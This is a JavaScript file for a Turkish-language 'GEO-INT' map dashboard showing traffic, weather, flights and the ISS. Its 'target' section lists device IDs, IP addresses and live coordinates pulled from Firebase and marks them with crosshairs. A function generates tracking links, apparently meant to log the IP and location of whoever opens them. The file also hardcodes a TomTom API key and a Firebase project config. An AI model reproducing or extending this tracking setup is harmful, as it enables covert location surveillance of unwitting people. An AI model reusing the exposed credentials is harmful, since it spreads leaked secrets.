// --- CONFIG ---
const TOMTOM_KEY = '3xX5NwSGmW2O8MyQ9fwOPqHA8chsMdY1'; 
const firebaseConfig = {
    apiKey: "AIzaSyCDNbgKzJdBKEZUnWH09Az6ZCwUefWJXhY",
    authDomain: "onlinesiparis-2cf91.firebaseapp.com",
    projectId: "onlinesiparis-2cf91",
    databaseURL: "https://onlinesiparis-2cf91-default-rtdb.europe-west1.firebasedatabase.app",
    storageBucket: "onlinesiparis-2cf91.appspot.com",
    messagingSenderId: "366801664755",
    appId: "1:366801664755:web:57b577f1943ebdf1ab8c85"
};

let map, trafficLayer, deviceMarkers = {}, flightMarkers = [], issMarker;
let activeModules = { traffic: true, flights: false, iss: true };

// SİSTEM BAŞLATMA
if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const database = firebase.database();

document.addEventListener('DOMContentLoaded', () => {
    initMap();
    setInterval(updateClock, 1000);
    setInterval(updateISS, 5000); // 5 saniyede bir ISS güncelle
    addLog("GEO-INT v10.0 BAŞLATILDI. GLOBAL SENSÖRLER AKTİF.");
});

function initMap() {
    map = L.map('map', { center: [41.0082, 28.9784], zoom: 11, zoomControl: false });
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
    
    trafficLayer = L.tileLayer(`https://{s}.api.tomtom.com/traffic/map/4/tile/flow/relative0/{z}/{x}/{y}.png?key=${TOMTOM_KEY}`, { opacity: 0.8 }).addTo(map);
    trafficLayer.on('add', () => trafficLayer.getContainer().classList.add('road-flow-layer'));

    map.on('click', onMapAnalysis);
}

// --- ŞEHİR VE YOL ANALİZİ (GÜNCELLENMİŞ MANTIK) ---
async function onMapAnalysis(e) {
    const { lat, lng } = e.latlng;
    const popup = L.popup().setLatLng(e.latlng).setContent('<div class="text-[9px] animate-pulse">DERİN ANALİZ YAPILIYOR...</div>').openOn(map);

    try {
        const addrP = fetch(`https://api.tomtom.com/search/2/reverseGeocode/${lat},${lng}.json?key=${TOMTOM_KEY}&language=tr-TR`).then(r => r.json());
        const flowP = fetch(`https://api.tomtom.com/traffic/services/4/flowSegmentData/relative0/10/json?key=${TOMTOM_KEY}&point=${lat},${lng}`).then(r => r.json());
        const weatherP = fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lng}&current_weather=true`).then(r => r.json());

        const [addr, flow, weather] = await Promise.all([addrP, flowP, weatherP]);

        // Trafik Mantığı Düzeltmesi: Ratio = Current / Freeflow
        let trafficInfo = "AKICI", tColor = "text-green-500", tDesc = "Yol açık.";
        if (flow.flowSegmentData) {
            const ratio = flow.flowSegmentData.currentSpeed / flow.flowSegmentData.freeFlowSpeed;
            if (ratio < 0.4) { trafficInfo = "KAPALI / ÇALIŞMA"; tColor = "text-red-600"; tDesc = "Yol kapalı veya ağır kaza/çalışma mevcut."; }
            else if (ratio < 0.75) { trafficInfo = "YOĞUN"; tColor = "text-yellow-500"; tDesc = "Araç yoğunluğu mevcut."; }
        }

        popup.setContent(`
            <div class="text-[10px] space-y-2 p-1 font-mono">
                <b class="text-red-600 border-b border-white/10 block pb-1 underline uppercase italic">City Analysis Report</b>
                <div><b>ADRES:</b> <span class="text-white">${addr.addresses[0].address.freeformAddress}</span></div>
                <div class="flex justify-between border-y border-white/5 py-1">
                    <span><b>HAVA:</b> ${weather.current_weather.temperature}°C</span>
                    <span><b>RÜZGAR:</b> ${weather.current_weather.windspeed} km/h</span>
                </div>
                <div><b>TRAFİK:</b> <span class="${tColor} font-bold">${trafficInfo}</span></div>
                <div class="bg-red-900/10 p-1 italic text-[9px] border-l-2 border-red-600">${tDesc}</div>
                <div class="text-[8px] text-gray-600 pt-1">SAT_COORD: ${lat.toFixed(5)}, ${lng.toFixed(5)}</div>
            </div>
        `);
        addLog(`Bölge Analizi Tamamlandı: ${addr.addresses[0].address.freeformAddress}`);
    } catch (err) { popup.setContent("HATA: İstihbarat kesintisi."); }
}

// --- UÇAK TAKİBİ (OpenSky API) ---
async function fetchFlights() {
    if (!activeModules.flights) return;
    try {
        const bounds = map.getBounds();
        const url = `https://opensky-network.org/api/states/all?lamin=${bounds.getSouth()}&lomin=${bounds.getWest()}&lamax=${bounds.getNorth()}&lomax=${bounds.getEast()}`;
        const res = await fetch(url);
        const data = await res.json();

        flightMarkers.forEach(m => map.removeLayer(m));
        flightMarkers = [];

        if (data.states) {
            data.states.slice(0, 30).forEach(s => {
                const fMarker = L.marker([s[6], s[5]], {
                    icon: L.divIcon({ className: 'f-icon', html: `<i class="fas fa-plane text-yellow-500" style="transform: rotate(${s[10]}deg)"></i>` })
                }).addTo(map).bindPopup(`<b>Uçuş:</b> ${s[1]}<br><b>Ülke:</b> ${s[2]}<br><b>İrtifa:</b> ${Math.round(s[7])}m`);
                flightMarkers.push(fMarker);
            });
            addLog(`Hava Sahası: ${data.states.length} uçuş tespit edildi.`);
        }
    } catch (e) { console.error("Flight API Error"); }
}

// --- ISS UYDU TAKİBİ ---
async function updateISS() {
    if (!activeModules.iss) return;
    try {
        const res = await fetch('https://api.wheretheiss.at/v1/satellites/25544');
        const data = await res.json();
        const pos = [data.latitude, data.longitude];
        if (!issMarker) {
            issMarker = L.marker(pos, { icon: L.divIcon({ className: 'iss-icon', html: '<i class="fas fa-satellite fa-2x text-cyan-400 animate-pulse"></i>' }) }).addTo(map);
        } else {
            issMarker.setLatLng(pos);
        }
    } catch (e) {}
}

// --- HEDEF YÖNETİMİ VE TAKİBİ ---
database.ref('locations').on('value', (snapshot) => {
    const data = snapshot.val();
    const list = document.getElementById('deviceList');
    list.innerHTML = ''; 
    if (!data) { list.innerHTML = '<div class="text-gray-600 italic text-center py-4">Sinyal bekleniyor...</div>'; return; }

    for (let id in data) {
        const info = data[id];
        const div = document.createElement('div');
        div.className = "glass-panel p-3 border-l-2 border-green-500 text-[10px] group pointer-events-auto hover:border-cyan-500 transition-all cursor-pointer";
        div.onclick = () => map.flyTo([info.lat, info.lng], 17);
        div.innerHTML = `
            <div class="flex justify-between items-center">
                <span class="text-green-400 font-bold italic tracking-widest">${id}</span>
                <button onclick="event.stopPropagation(); deleteDevice('${id}')" class="text-red-600 opacity-0 group-hover:opacity-100 transition-all"><i class="fas fa-trash-alt"></i></button>
            </div>
            <div class="text-[9px] text-gray-500 mt-2 space-y-1 font-mono">
                <div>IP: <span class="text-white">${info.ip || '...'}</span></div>
                <div class="text-cyan-500 font-bold mt-1">COORD: ${info.lat.toFixed(4)}, ${info.lng.toFixed(4)}</div>
            </div>`;
        list.appendChild(div);
        
        if (deviceMarkers[id]) deviceMarkers[id].setLatLng([info.lat, info.lng]);
        else deviceMarkers[id] = L.marker([info.lat, info.lng], { icon: L.divIcon({ className: 'd-icon', html: `<i class="fas fa-crosshairs text-green-500 fa-2x animate-pulse"></i>` }) }).addTo(map);
    }
});

// MODÜL KONTROL
function toggleLayer(t) {
    activeModules[t] = !activeModules[t];
    const btn = document.getElementById('btn-' + t);
    btn.classList.toggle('active');
    if (t === 'traffic') map.hasLayer(trafficLayer) ? map.removeLayer(trafficLayer) : trafficLayer.addTo(map);
    if (t === 'flights') { if(activeModules.flights) setInterval(fetchFlights, 15000); else flightMarkers.forEach(m => map.removeLayer(m)); }
    addLog(`${t.toUpperCase()} modülü güncellendi.`);
}

// DİĞER FONKSİYONLAR
function updateClock() { document.getElementById('sysTime').innerText = new Date().toLocaleTimeString('tr-TR'); }
function addLog(m) {
    const f = document.getElementById('dataFeed');
    const d = document.createElement('div');
    d.innerHTML = `<span class="text-red-900">[${new Date().toLocaleTimeString()}]</span> ${m}`;
    f.prepend(d);
}
function generateTrackingLink() {
    const nodeId = "NODE_" + (Math.floor(Math.random() * 9000) + 1000);
    document.getElementById('generatedLink').value = `https://berkaytdev.com/track.html?id=${nodeId}`;
    document.getElementById('linkModal').classList.remove('hidden');
}
